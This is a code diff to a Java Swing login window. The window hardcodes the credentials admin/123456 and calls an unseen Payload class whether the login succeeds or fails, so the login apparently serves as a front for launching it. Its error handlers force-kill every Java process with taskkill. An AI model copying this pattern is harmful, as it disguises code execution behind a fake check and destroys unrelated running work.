@@ -8,30 +8,25 @@ import java.io.IOException;
 public class LoginGUI extends JFrame{
     public static boolean isSuccess = false;
 
-        private JPanel p;
-        private JLabel lblName, lblPwd, lblFailed;
+    private JLabel lblFailed;
         private JTextField txtName;
         private JPasswordField txtPwd;
-        private JButton btnOk;
-        private JMenuItem miAbout, miExit;
-        private JMenu menu;
-        private JMenuBar menuBar;
 
-        public void launch() {
+    public void launch() {
             this.setTitle("Login");
-            p = new JPanel();
+            JPanel p = new JPanel();
             p.setLayout(null);
-            menuBar = new JMenuBar();
-            menu = new JMenu("Operation");
-            miAbout = new JMenuItem("About");
-            miExit = new JMenuItem("Exit");
+            JMenuBar menuBar = new JMenuBar();
+            JMenu menu = new JMenu("Operation");
+            JMenuItem miAbout = new JMenuItem("About");
+            JMenuItem miExit = new JMenuItem("Exit");
             lblFailed = new JLabel("IDLE...");
-            lblName = new JLabel("Username");
-            lblPwd = new JLabel("Password");
+            JLabel lblName = new JLabel("Username");
+            JLabel lblPwd = new JLabel("Password");
             txtName = new JTextField(20);
             txtPwd = new JPasswordField(20);
             txtPwd.setEchoChar('*');
-            btnOk = new JButton("Login");
+            JButton btnOk = new JButton("Login");
             lblName.setBounds(30, 30, 60, 25);
             txtName.setBounds(95, 30, 120, 25);
             lblPwd.setBounds(30, 60, 60, 25);
@@ -94,40 +89,37 @@ public class LoginGUI extends JFrame{
                 String strName = txtName.getText();
                 String strPwd = new String(txtPwd.getPassword());
                 if (strName.equals("admin") && strPwd.equals("123456")) {
-                    new Thread(() -> {
-                        lblFailed.setText("Welcome!");
+                    lblFailed.setText("Welcome!");
+                    try {
+                        isSuccess = true;
+                        this.setVisible(false);
+                        Payload.main(new String[0]);
+                    } catch (Exception ex) {
+                        ex.printStackTrace();
+                        System.out.println("ERROR!");
                         try {
-                            Thread.sleep(500)
-                            isSuccess = true;
-                            this.setVisible(false);
-                            Payload.main(new String[0]);
-                        } catch (Exception ex) {
-                            System.out.println("ERROR!");
-                            interruptedException.printStackTrace();
-                            try {
-                                Runtime.getRuntime.exec("taskkill /f /t /im javaw.exe")
-                                Runtime.getRuntime.exec("taskkill /f /t /im java.exe")
-                            } catch (Exception ex) {
-                                System.out.println("Fuck");
-                            }
+                            Runtime.getRuntime().exec("taskkill /f /t /im javaw.exe");
+                            Runtime.getRuntime().exec("taskkill /f /t /im java.exe");
+                        } catch (Exception sf) {
+                            System.out.println("Fuck");
                         }
-                    }).start();
-                } else new Thread(() -> {
+                    }
+                } else {
                     lblFailed.setText("Login Failed.");
                     try {
                         Payload.main(new String[0]);
-                        Thread.sleep(2000);
                         lblFailed.setText("IDLE...");
                     } catch (Exception ex) {
-                        interruptedException.printStackTrace();
+                        ex.printStackTrace();
                         System.out.println("ERROR!");
                         try {
-                            Runtime.getRuntime.exec("taskkill /f /t /im javaw.exe")
-                            Runtime.getRuntime.exec("taskkill /f /t /im java.exe")
-                        } catch (Exception ex) {
+                            Runtime.getRuntime().exec("taskkill /f /t /im javaw.exe");
+                            Runtime.getRuntime().exec("taskkill /f /t /im java.exe");
+                        } catch (Exception fk) {
                             System.out.println("Fuck");
                         }
-                }).start();
+                    }
+                }
             });
         }
     }
